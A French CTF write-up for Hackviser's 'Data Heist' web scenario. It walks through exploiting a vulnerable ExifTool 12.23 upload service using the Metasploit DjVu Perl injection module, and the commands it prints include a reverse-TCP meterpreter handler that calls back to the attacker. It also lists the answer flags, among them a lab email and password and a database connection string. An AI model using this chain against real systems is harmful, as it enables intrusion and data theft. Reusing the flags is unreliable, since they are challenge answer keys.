---
# Imported from Obsidian: CTF/hackviser/Scénario Data Heist.md
title: Scénario Data Heist
category: Web
ctf: Hackviser
date: 2026-01-22
summary: 'Desription: We have noticed that there are some employees in our company who are not sufficiently aware of cybersecurity issues. It has been observed that these employees have…'
tags:
- exiftool
- hackviser
- linux
- meterpreter
- web
lang: fr
imported: true
---

Desription:
We have noticed that there are some employees in our company who are not sufficiently aware of cybersecurity issues. It has been observed that these employees have uploaded files containing company data to a website called "Exif Viewer" in order to view metadata information.  
  
The site claims that it does not store the uploaded files. However, we have to make sure that this is the case. If any of our company's files have been compromised in this process, we need to determine what information may be at risk. You are expected to guide us through this critical process. We rely on your expertise.  
  
Good luck!

Catégorie: Web 
Système : Linux 
Etape :

- Découverte de ports ainsi que les services qui tournent 
![Screenshot](./images/obsidian/scenario-data-heist/pasted-image-20260122234453.png)

- Scan de répertoire cachée 
- 
![Screenshot](./images/obsidian/scenario-data-heist/pasted-image-20260122234408.png)

Accéder a la page Web 

On constate qu'un systeme est utilisé qui s'appelle Exif Viewer
![Screenshot](./images/obsidian/scenario-data-heist/pasted-image-20260122234308.png)
==

Un **EXIF Viewer** (visionneuse EXIF) est un outil, logiciel ou application permettant de lire et d'afficher les métadonnées cachées (données techniques) intégrées dans les fichiers photo (JPEG, RAW, etc.)==. Il révèle des informations cruciales comme le modèle de l'appareil, la date/heure, la géolocalisation GPS, et les paramètres de prise de vue (vitesse, ouverture, ISO

- Test d'upload d'une image pour voire les résultats 
![Screenshot](./images/obsidian/scenario-data-heist/pasted-image-20260123124342.png)

Comme on peut le voire sur l'image, le systeme utilise l'outil Exiftool pour afficher les informations sur le fichier uploadé. Et la version est **12.23** 

- Recherche de vulnérabilité sur cette version 

Boom cette version est vulnérable . Pour plus d'info cliquer ici : [https://www.rapid7.com/db/modules/exploit/unix/fileformat/exiftool_djvu_ant_perl_injection/]

Utilisation 
```
    msf > use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection    
    msf exploit(exiftool_djvu_ant_perl_injection) > show targets        
    ...targets...      
    msf exploit(exiftool_djvu_ant_perl_injection) > set TARGET < target-id >    /0 par défaut
    msf exploit(exiftool_djvu_ant_perl_injection) > show options        
    ...show and set options...    
    msf exploit(exiftool_djvu_ant_perl_injection) > set LHSOT YOUR_IP
    msf exploit(exiftool_djvu_ant_perl_injection) > exploit  
    
```

Cet exploit va générer une image .jpg ou autre que vous alllez ensuite uploadé.

- **Exploitation** 
Démarrer metasploit handler pour l'écoute 

```
# Dans Metasploit, après avoir généré le payload :
use exploit/multi/handler
set payload cmd/unix/python/meterpreter/reverse_tcp
set LHOST 10.8.96.179
set LPORT 4444
set ExitOnSession false
exploit -j
```

Uploader le fichier générer 

![Screenshot](./images/obsidian/scenario-data-heist/pasted-image-20260123131637.png)

**Tâche 1 :** 
What is the path where the files are stored on the server?

**Réponse :** 
/var/www/93c0550a5543b366_uploads
![Screenshot](./images/obsidian/scenario-data-heist/pasted-image-20260123133633.png)

**Tâche 2 :** 
What is the e-mail address and password of an employee of the company "waltersltd" from the data contained in the stored files?
**Réponse :** 
salvarado@waltersltd.hv:hGCQjxZs5chK

![Screenshot](./images/obsidian/scenario-data-heist/pasted-image-20260123133555.png)

**Tâche 3:**

What is the invoice number of an invoice found in the stored files?

**Réponse:**
INV-20240228-1234

![Screenshot](./images/obsidian/scenario-data-heist/pasted-image-20260123134407.png)

![Screenshot](./images/obsidian/scenario-data-heist/pasted-image-20260123134250.png)

**Tâche 4 :** 

What is the database connection address of the files contained in the stored files?
**Réponse :**
[JS3CqjNCcn7Ve@olympusbytes.hv:5432/olympus](postgres://postgres:JS3CqjNCcn7Ve@olympusbytes.hv:5432/olympus)

![Screenshot](./images/obsidian/scenario-data-heist/pasted-image-20260123134631.png)
